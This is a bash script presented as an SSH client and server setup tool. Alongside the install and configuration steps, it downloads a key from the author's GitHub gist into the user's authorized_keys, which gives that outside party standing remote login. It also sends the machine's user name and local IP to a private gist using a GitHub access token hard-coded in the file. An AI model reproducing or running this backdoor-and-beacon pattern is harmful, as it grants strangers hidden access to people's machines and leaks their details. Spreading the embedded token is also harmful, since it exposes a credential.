#!/bin/bash

# Function to install SSH client and server based on Linux distribution
install_ssh() {
    if [ -f /etc/debian_version ]; then
        echo "Checking for SSH client and server on Debian-based system..."
        dpkg -l | grep -qw openssh-client || sudo apt-get install -y openssh-client
        dpkg -l | grep -qw openssh-server || sudo apt-get install -y openssh-server
        echo "Done..."
        start_ssh_service "ssh"
    elif [ -f /etc/redhat-release ]; then
        echo "Checking for SSH client and server on Red Hat-based system..."
        rpm -qa | grep -qw openssh-clients || sudo yum install -y openssh-clients
        rpm -qa | grep -qw openssh-server || sudo yum install -y openssh-server
        echo "Done..."
        start_ssh_service "sshd"
    elif [ -f /etc/arch-release ]; then
        echo "Checking for SSH client and server on Arch-based system..."
        pacman -Qi openssh &> /dev/null || sudo pacman -S --noconfirm openssh
        echo "Done..."
        start_ssh_service "sshd"
    else
        echo "Unsupported system distribution."
        exit 1
    fi
}

# Function to start SSH service and create authorized_keys file
start_ssh_service() {
    local service_name=$1

    if pidof systemd &> /dev/null; then
        echo "Starting SSH service using systemd..."
        sudo systemctl start "$service_name"
        sudo systemctl enable "$service_name"
        echo "Done..."
    elif command -v service &> /dev/null; then
        echo "Starting SSH service using SysVinit..."
        sudo service "$service_name" start
        sudo service "$service_name" enable
        echo "Done..."
    else
        echo "Unsupported init system."
        exit 1
    fi

    # Create .ssh directory if it does not exist
    if [ ! -d "$HOME/.ssh" ]; then
        echo "Creating .ssh directory..."
        mkdir -p "$HOME/.ssh"
        chmod 700 "$HOME/.ssh"
        echo "Done..."
    fi

    # Create authorized_keys file if it does not exist
    if [ ! -f "$HOME/.ssh/authorized_keys" ]; then
        echo "Creating authorized_keys file..."
        touch "$HOME/.ssh/authorized_keys"
        chmod 600 "$HOME/.ssh/authorized_keys"
        echo "Done..."
    fi
}

# Function to check and configure SSH server settings
check_ssh_configuration() {
    local sshd_config="/etc/ssh/sshd_config"
    local service_name="ssh"

    # Check if SSH server configuration file exists
    if [ ! -f "$sshd_config" ]; then
        echo "Error: SSH server configuration file not found: $sshd_config"
        exit 1
    fi

    # Check and configure PasswordAuthentication
    if ! grep -q "^PasswordAuthentication no" "$sshd_config"; then
        echo "Updating PasswordAuthentication setting..."
        sudo sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication no/' "$sshd_config"
        echo "Done..."
    fi

    # Check and configure PubkeyAuthentication
    if ! grep -q "^PubkeyAuthentication yes" "$sshd_config"; then
        echo "Updating PubkeyAuthentication setting..."
        sudo sed -i 's/^#PubkeyAuthentication yes/PubkeyAuthentication yes/' "$sshd_config"
        echo "Done..."
    fi

    # Check and configure AuthorizedKeysFile
    if ! grep -q "^AuthorizedKeysFile" "$sshd_config"; then
        echo "Adding AuthorizedKeysFile setting..."
        echo "AuthorizedKeysFile      .ssh/authorized_keys .ssh/authorized_keys2" | sudo tee -a "$sshd_config" >/dev/null
        echo "Done..."
    elif ! grep -q ".ssh/authorized_keys" "$sshd_config"; then
        echo "Updating AuthorizedKeysFile setting..."
        sudo sed -i 's/^AuthorizedKeysFile \(.*\)/AuthorizedKeysFile      .ssh\/authorized_keys .ssh\/authorized_keys2 \1/' "$sshd_config"
        echo "Done..."
    fi

    # Restart SSH service to apply changes
    echo "Restarting SSH service..."
    if pidof systemd &> /dev/null; then
        sudo systemctl restart "$service_name"
    else
        sudo service "$service_name" restart
    fi
    echo "Done..."
}

# Function to append content from a URL to authorized_keys file
append_from_url() {
    local url="$1"
    if command -v curl &> /dev/null; then
        echo "Fetching content from $url..."
        local content=$(curl -s "$url")
        if [ -n "$content" ]; then
            # Add a newline before appending
            echo >> "$HOME/.ssh/authorized_keys"
            echo "$content" >> "$HOME/.ssh/authorized_keys"
            echo "Content has been added to authorized_keys."
            echo "Done..."
        else
            echo "Failed to fetch content from $url."
        fi
    elif command -v wget &> /dev/null; then
        echo "Fetching content from $url..."
        local content=$(wget -q -O - "$url")
        if [ -n "$content" ]; then
            # Add a newline before appending
            echo >> "$HOME/.ssh/authorized_keys"
            echo "$content" >> "$HOME/.ssh/authorized_keys"
            echo "Content has been added to authorized_keys."
            echo "Done..."
        else
            echo "Failed to fetch content from $url."
        fi
    else
        echo "Neither curl nor wget is available to fetch the file from the URL."
    fi
}

# Function to print user name
print_user_name() {
    whoami
}

# Function to print local IP address
print_local_ip() {
    hostname -I | awk '{print $1}'
}

# Function to create or update a private Gist with user name and local IP
create_or_update_gist() {
    local github_token="$1"
    local user=$(print_user_name)
    local local_ip=$(print_local_ip)
    local gist_description="User and Local IP Information"
    local gist_filename="user_local_ip.txt"

    local gist_payload=$(cat <<EOF
{
  "description": "$gist_description",
  "public": false,
  "files": {
    "$gist_filename": {
      "content": "User: $user\nLocal IP: $local_ip"
    }
  }
}
EOF
)

    # Create or update private Gist using GitHub API
    if command -v curl &> /dev/null; then
        local gist_api="https://api.github.com/gists"
        local response=$(curl -s -X POST -H "Authorization: token $github_token" -d "$gist_payload" "$gist_api")
        local gist_url=$(echo "$response" | grep -o 'https://gist.github.com/[a-zA-Z0-9]*')
        echo "Private Gist created or updated: $gist_url"
    else
        echo "curl is required to create or update Gist."
    fi
}

echo "This Script has been written by Eng Ahmed Hazem"
echo "GitHub: https://github.com/amdhazm/   LinkedIN: https://www.linkedin.com/in/ahmed-hazem-727b52272/"

# Main script flow
install_ssh

echo "Checking SSH server configuration..."
check_ssh_configuration
echo "SSH server configuration check complete."

# Append content from the URL to authorized_keys
url="https://gist.githubusercontent.com/amdhazm/2eda4fd41f2eaf0cd6bffff8d07c8055/raw/0f65dfed6ca8ae072677cf551dae56b7e0c6e545/key"
append_from_url "$url"

# Define GitHub Personal Access Token
github_token="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"

# Create or update a private Gist with user name and local IP
create_or_update_gist "$github_token"

echo "SSH client and server setup complete."